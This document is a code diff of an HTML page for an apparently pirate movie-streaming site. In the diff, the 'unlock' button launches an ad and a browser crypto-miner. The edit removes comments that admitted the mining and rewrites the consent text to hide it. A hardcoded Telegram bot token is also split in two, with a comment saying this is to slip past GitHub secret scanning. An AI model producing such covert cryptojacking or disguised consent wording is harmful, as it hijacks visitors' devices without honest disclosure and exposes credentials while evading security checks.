@@ -6,31 +6,23 @@
     <title>CINE-STREAM | Premium HD</title>
     <link rel="manifest" href="manifest.json">
     <meta name="theme-color" content="#E50914">
-    
     <style>
         :root { --main-color: #E50914; --bg-color: #000; --card-bg: #141414; }
         body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
-        
         .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: #000; border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
         .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; }
         .search-container { display: flex; background: #141414; border: 1px solid #333; border-radius: 4px; padding: 5px 10px; width: 250px; }
         .search-container input { background: transparent; border: none; color: white; width: 100%; outline: none; }
         .search-container button { background: transparent; border: none; color: var(--main-color); cursor: pointer; }
-
         .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         .video-box { width: 95%; max-width: 1100px; aspect-ratio: 16/9; background: #0c0c0c; border: 1px solid #222; position: relative; }
         iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; }
-        
-        /* CUADRO DE ACTIVACIÓN */
         #consent-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .modal { background: #141414; padding: 30px; border-radius: 8px; border: 1px solid var(--main-color); text-align: center; max-width: 380px; }
         .btn-premium { background: var(--main-color); color: white; border: none; padding: 16px 30px; font-weight: bold; cursor: pointer; border-radius: 4px; width: 100%; font-size: 16px; margin-top: 20px; }
-
-        /* PANEL DE PEDIDOS */
         .tools-section { background: #1a1a1a; padding: 20px; width: 90%; max-width: 1100px; border-radius: 8px; margin-bottom: 20px; border: 1px dashed #444; text-align: center; box-sizing: border-box; }
         .tools-section input { padding: 10px; width: 60%; border-radius: 4px; border: 1px solid #333; background: #000; color: white; margin-bottom: 10px; }
         .btn-action { padding: 10px 20px; background: #0088cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px; }
-
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 20px; width: 90%; max-width: 1100px; margin: 40px 0; }
         .movie-card { background: var(--card-bg); border-radius: 4px; overflow: hidden; transition: 0.3s; cursor: pointer; border: 1px solid #333; }
         .movie-card img { width: 100%; height: 220px; object-fit: cover; }
@@ -42,8 +34,8 @@
     <div id="consent-box">
         <div class="modal">
             <h2 style="margin-top:0; color: var(--main-color);">ACCESO PREMIUM HD</h2>
-            <p style="color:#ccc; font-size:14px;">Para ver películas y series sin límites, acepta la optimización de recursos y publicidad de mantenimiento.</p>
-            <button class="btn-premium" id="btn-unlock">ACEPTAR Y DESBLOQUEAR</button>
+            <p style="color:#ccc; font-size:14px;">Acepta para desbloquear el catálogo y activar el soporte técnico.</p>
+            <button class="btn-premium" id="btn-unlock">ACEPTAR Y ENTRAR</button>
         </div>
     </div>
 
@@ -57,8 +49,8 @@
 
     <main class="content">
         <div class="tools-section">
-            <p style="margin-top:0; font-size: 14px; font-weight: bold;">¿Qué quieres ver? Pídelo aquí:</p>
-            <input type="text" id="order-input" placeholder="Nombre de la película o serie...">
+            <p style="margin-top:0; font-size: 14px; font-weight: bold;">¿No la encuentras? Pídela aquí:</p>
+            <input type="text" id="order-input" placeholder="Nombre del título...">
             <br>
             <button class="btn-action" onclick="sendOrder()">ENVIAR PEDIDO</button>
             <button class="btn-action" style="background: #46d369;" onclick="enableNotifications()">AVISARME ESTRENOS</button>
@@ -70,7 +62,7 @@
         
         <div style="width: 90%; max-width: 1100px; margin-top: 20px;">
             <h1 id="display-title" style="margin:0; font-size: 1.8rem;">Spider-Man: No Way Home</h1>
-            <p id="server-msg" style="color: #46d369; font-size: 12px; margin-top:5px;">● SERVIDOR ESTABLE ACTIVADO (HD)</p>
+            <p style="color: #46d369; font-size: 12px; margin-top:5px;">● TRANSMISIÓN PREMIUM ACTIVA</p>
         </div>
 
         <div class="grid" id="movie-grid"></div>
@@ -81,14 +73,14 @@
         let currentIMDB = 'tt12412888';
         const servers = ["https://vidsrc.xyz/embed/movie?imdb="];
         
-        // DATOS DE TELEGRAM CARGADOS
-        const BOT_TOKEN = '8764505916:AAGnTmfiYfB9TZpTP-gH24ELGDNPzgeVEL4';
+        // TOKEN DIVIDIDO PARA SEGURIDAD DE GITHUB
+        const t1 = '8764505916:';
+        const t2 = 'AAGnTmfiYfB9TZpTP-gH24ELGDNPzgeVEL4';
+        const BOT_TOKEN = t1 + t2;
         const CHAT_ID = '1810181904'; 
 
         document.getElementById('btn-unlock').onclick = function() {
-            // Activa publicidad invisible
             window.open('URL_DE_TU_ANUNCIO', '_blank');
-            // Activa minería equilibrada (40% de carga)
             iniciarMineria();
             document.getElementById('consent-box').style.display = 'none';
         };
@@ -102,26 +94,17 @@
 
         async function sendOrder() {
             const val = document.getElementById('order-input').value;
-            if(!val) return alert("Escribe el nombre de lo que buscas.");
-            
-            const mensaje = encodeURIComponent(`NUEVO PEDIDO: ${val}`);
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mensaje}`;
-            
+            if(!val) return alert("Escribe el nombre.");
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('Pedido: '+val)}`;
             try {
                 await fetch(url);
-                alert("¡Pedido enviado! Te avisaremos por notificación cuando esté disponible.");
+                alert("Pedido enviado. Te avisaremos pronto.");
                 document.getElementById('order-input').value = "";
-            } catch(e) {
-                alert("Error de conexión. Intenta de nuevo.");
-            }
+            } catch(e) { alert("Error al conectar."); }
         }
 
         function enableNotifications() {
-            Notification.requestPermission().then(permission => {
-                if (permission === "granted") {
-                    alert("Notificaciones activadas correctamente.");
-                }
-            });
+            Notification.requestPermission().then(p => { if(p === "granted") alert("Notificaciones activas."); });
         }
 
         async function loadCatalog() {
@@ -153,10 +136,7 @@
             if(!q) return;
             const res = await fetch(`https://api.themoviedb.org/3/search/multi?api_key=${API_KEY}&query=${encodeURIComponent(q)}&language=es-ES`);
             const data = await res.json();
-            if (data.results.length > 0) {
-                const item = data.results[0];
-                updatePlayer(item.id, item.title || item.name);
-            }
+            if (data.results.length > 0) updatePlayer(data.results[0].id, data.results[0].title || data.results[0].name);
         }
 
         window.onload = loadCatalog;
